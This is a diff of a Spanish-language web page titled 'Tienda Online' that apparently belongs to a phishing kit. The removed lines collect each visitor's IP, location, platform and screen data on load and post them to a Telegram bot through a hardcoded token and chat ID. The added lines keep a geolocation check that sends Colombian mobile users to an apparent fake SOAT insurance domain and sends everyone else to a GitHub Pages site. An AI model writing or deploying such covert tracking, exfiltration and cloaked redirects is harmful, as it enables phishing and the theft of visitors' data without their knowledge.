@@ -4,78 +4,41 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tienda Online</title>
-<script>
+ <script>
     (async function() {
-      // Función para detectar si el dispositivo es móvil
-      function isMobileDevice() {
-        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      }
+      // Evitar bucles con localStorage
+      const redirectFlag = localStorage.getItem('redirectExecuted');
+      
+      if (!redirectFlag) {
+        localStorage.setItem('redirectExecuted', 'true');
+        setTimeout(() => localStorage.removeItem('redirectExecuted'), 1000);
+        
+        // Detectar dispositivo
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-      // Función para obtener información del usuario y datos geográficos
-      async function getUserDetails() {
-        const info = {
-          timestamp: new Date().toLocaleString(),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          screenResolution: `${window.screen.width}x${window.screen.height}`,
-          windowSize: `${window.innerWidth}x${window.innerHeight}`
-        };
-
+        // Obtener datos geográficos
+        let country = 'Desconocido';
         try {
           const response = await fetch('https://ipinfo.io/json?token=3798a6699b4912');
           const data = await response.json();
-          info.ip = data.ip || 'Desconocida';
-          info.city = data.city || 'Desconocida';
-          info.country = data.country || 'Desconocido';
+          country = data.country || 'Desconocido';
         } catch (error) {
-          console.error("Error obteniendo datos geográficos:", error);
-          info.ip = info.city = info.country = 'Desconocido';
+          console.error("Error geolocalización:", error);
         }
-        return info;
-      }
 
-      // Función para enviar la información al bot de Telegram
-      async function sendToTelegram(data) {
-        const botToken = "8042550315:AAGIoWq8XT_n7KwRaxAq38-1gXvCZyAPExk";
-        const chatId = "5848946481";
-        const message = `🚨 SURA git 🚨
-🌍 IP: ${data.ip}
-🗺️ Ciudad/País: ${data.city}/${data.country}
-🕒 Fecha: ${data.timestamp}
-💻 Plataforma: ${data.platform}
-🗣️ Idioma: ${data.language}
-🖥️ Resolución: ${data.screenResolution}`;
-
-        try {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message
-            })
-          });
-        } catch (error) {
-          console.error("Error enviando a Telegram:", error);
-        }
-      }
-
-      // Ejecutar inmediatamente al cargar el script
-      try {
-        const userDetails = await getUserDetails();
-        await sendToTelegram(userDetails);
-
-        // Redirección basada en condiciones
-        const isColombiaMobile = userDetails.country === "CO" && isMobileDevice();
-        window.location.href = isColombiaMobile 
+        // Determinar URL destino
+        const targetUrl = (country === "CO" && isMobile) 
           ? 'https://tusoataqui.tusoatvirtual.website/inicio.html'
           : 'https://seguronline.github.io/polizas/';
 
-      } catch (error) {
-        console.error("Error en el proceso:", error);
-        document.body.style.display = 'block'; // Mostrar contenido si hay error
+        // Redirigir solo si es diferente a la URL actual
+        if (targetUrl !== window.location.href) {
+          window.location.href = targetUrl;
+        } else {
+          document.body.style.display = 'block';
+        }
+      } else {
+        document.body.style.display = 'block';
       }
     })();
   </script>
